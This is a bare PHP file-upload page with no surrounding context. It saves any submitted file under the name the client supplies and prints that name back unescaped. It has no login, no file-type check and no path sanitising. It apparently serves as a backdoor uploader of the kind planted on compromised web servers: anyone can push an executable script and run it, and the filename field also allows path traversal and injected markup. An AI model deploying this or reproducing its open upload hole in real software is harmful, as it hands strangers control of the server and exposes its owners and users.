<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['f'])) {
    if (move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) {
        echo "✔️ Upload OK: <a href='{$_FILES['f']['name']}'>{$_FILES['f']['name']}</a>";
    } else {
        echo "❌ Upload Failed";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="f">
  <button type="submit">Upload</button>
</form>
                          